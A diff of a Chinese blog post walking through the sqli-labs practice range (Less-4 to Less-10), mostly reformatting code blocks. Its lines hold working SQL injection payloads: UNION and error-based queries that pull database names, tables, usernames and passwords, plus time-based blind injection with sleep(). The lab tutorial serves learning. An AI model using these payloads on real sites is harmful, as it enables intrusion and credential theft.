@@ -24,7 +24,7 @@
 <meta property="og:description" content="less-1 GET型注入-单引号-字符型注入 经过 and 1&#x3D;2测试，页面回显正常，所以不是数值查询  1127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2 --+   下一步，再id后加上’,页面回显不正常，表示可能存在SQL字符注入  1127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&amp;#x27;   输入–+将sql后面的语句注释掉">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-03-25T01:01:53.419Z">
-<meta property="article:modified_time" content="2022-04-10T08:35:14.516Z">
+<meta property="article:modified_time" content="2022-04-14T00:23:06.933Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sqli-labs靶场练习">
 <meta name="twitter:card" content="summary_large_image">
@@ -197,7 +197,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.1k 字
+      4.2k 字
     </span>
   
 
@@ -298,20 +298,20 @@
 </ol>
 <!-- 下边的关卡换种方式解析，原理一样 -->
 
-<h1 id="less-4-GET型注入-双引号字符型"><a href="#less-4-GET型注入-双引号字符型" class="headerlink" title="less-4 GET型注入-双引号字符型"></a>less-4 GET型注入-双引号字符型</h1><p>查看源代码：<br>可以看到页面显示Please input the ID as parameter with number value<br>按它说的在URL分别尝试输入 ?id&#x3D;1  ?id&#x3D;1’ ?id&#x3D;1”<br>发现回显不正常，构建sql语句即可：<br>?id&#x3D;-1)” union select 1,group concat(char(32),username,char(23)),group_concat(char(32)，password,char(32)) from users–+</p>
+<h1 id="less-4-GET型注入-双引号字符型"><a href="#less-4-GET型注入-双引号字符型" class="headerlink" title="less-4 GET型注入-双引号字符型"></a>less-4 GET型注入-双引号字符型</h1><p>查看源代码：<br>可以看到页面显示Please input the ID as parameter with number value<br>按它说的在URL分别尝试输入 ?id&#x3D;1  ?id&#x3D;1’ ?id&#x3D;1”<br>发现回显不正常，构建sql语句即可：<br>        ?id&#x3D;-1)” union select 1,group concat(char(32),username,char(23)),group_concat(char(32)，password,char(32)) from users–+</p>
 <h1 id="less-5-GET型注入-单引号字符型"><a href="#less-5-GET型注入-单引号字符型" class="headerlink" title="less-5 GET型注入-单引号字符型"></a>less-5 GET型注入-单引号字符型</h1><p>查看源代码：<br>可以看到页面显示Please input the ID as parameter with number value</p>
 <p>提示：You are in…，和Less-4不同没有正常输出用户名和密码，我们查看一下index.php种的代码，发现没有输出$row查询结果，因为是双注入！<br>双注入指的是两个嵌套查询，先执行子查询，再执行外面的select。</p>
 <p>总之双注入情况下，当一个聚合函数后面出现group分组语句时，会将一部分查询结果以报错的形式返回。所以这里只能按它给的固定公式查询。<br>sql语句：</p>
-<div class="code-wrapper"><pre><code class="hljs">     (获取数据库名)
+<div class="code-wrapper"><pre><code class="hljs">(获取数据库名)
+    ?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+
+
+(获取表名)
+    ?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;).&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+
+
+(查询用户信息)
+    ?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat ws(char(32,44,32),id,username,password)from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+
 </code></pre></div>
-<p>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select database()),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p>
-<div class="code-wrapper"><pre><code class="hljs">     (获取表名)
-</code></pre></div>
-<p>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’).’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p>
-<div class="code-wrapper"><pre><code class="hljs">     (查询用户信息)
-</code></pre></div>
-<p>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select concat ws(char(32,44,32),id,username,password)from users limit 1,1),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p>
-<h1 id="less-6-GET型注入-双引号字符型"><a href="#less-6-GET型注入-双引号字符型" class="headerlink" title="less-6 GET型注入-双引号字符型"></a>less-6 GET型注入-双引号字符型</h1><p>和上面的思路一样，下面不在详细说明。查看源代码，在URL后输入?id&#x3D;1”试着让它报错。回显不正常，是双引号注入，构建语句：<br>?id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select concat ws(char(32,44,32),id,username,password)from users limit 0,1),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p>
+<h1 id="less-6-GET型注入-双引号字符型"><a href="#less-6-GET型注入-双引号字符型" class="headerlink" title="less-6 GET型注入-双引号字符型"></a>less-6 GET型注入-双引号字符型</h1><p>和上面的思路一样，下面不在详细说明。查看源代码，在URL后输入?id&#x3D;1”试着让它报错。回显不正常，是双引号注入，构建语句：<br>        id&#x3D;-1’ union select count(<em>),2,concat(‘</em>‘,(select concat ws(char(32,44,32),id,username,password)from users limit 0,1),’*’,floor(rand()*2))as a from information_schema.tables group by a–+</p>
 <h1 id="less-7-GET型注入-导出文件"><a href="#less-7-GET型注入-导出文件" class="headerlink" title="less-7 GET型注入-导出文件"></a>less-7 GET型注入-导出文件</h1><p>输入?id&#x3D;1，回显是”You have an error in your SQL syntax”提示use outfile，outfile固定格式是select A into outfile B ，A是文件内容、数数据库信息，B是文件路径。</p>
 <p>构造swlect * from users into outfile“数据库导入导出数据的目录”，判断是否最高权限。回显正常，说明是最高权限。（注意MySQL 5.7.6版本）</p>
 <h1 id="less-8-GET型注入-布尔型单引号"><a href="#less-8-GET型注入-布尔型单引号" class="headerlink" title="less-8 GET型注入-布尔型单引号"></a>less-8 GET型注入-布尔型单引号</h1><p>输入?id&#x3D;1，回显“you are in…”尝试单引号没有返回，盲注主要分为bool型和时间性，通常涉及到这几个函数:</p>
@@ -322,9 +322,10 @@
 <h1 id="less-9-GET型注入-时间盲注-单引号"><a href="#less-9-GET型注入-时间盲注-单引号" class="headerlink" title="less-9 GET型注入-时间盲注-单引号"></a>less-9 GET型注入-时间盲注-单引号</h1><p>按照代码提示：<br>Please input the ID as parameter with numeric value</p>
 <p>时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in……”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是You are in…..</p>
 <p>因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：</p>
-<p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>
+<div class="code-wrapper"><pre><code class="hljs">    ?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23
+</code></pre></div>
 <p>这里的意思是，如果数据库名首字母的ascii码大于115，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了，盲注脚本与less-8类似，只需要加入sleep函数即可。</p>
-<h1 id="less-10-GET型注入-时间盲注-双引号"><a href="#less-10-GET型注入-时间盲注-双引号" class="headerlink" title="less-10 GET型注入-时间盲注-双引号"></a>less-10 GET型注入-时间盲注-双引号</h1><p>同理less-9，语句：<br>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>
+<h1 id="less-10-GET型注入-时间盲注-双引号"><a href="#less-10-GET型注入-时间盲注-双引号" class="headerlink" title="less-10 GET型注入-时间盲注-双引号"></a>less-10 GET型注入-时间盲注-双引号</h1><p>同理less-9，语句：<br>        ?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>
 
             </div>
             <hr>
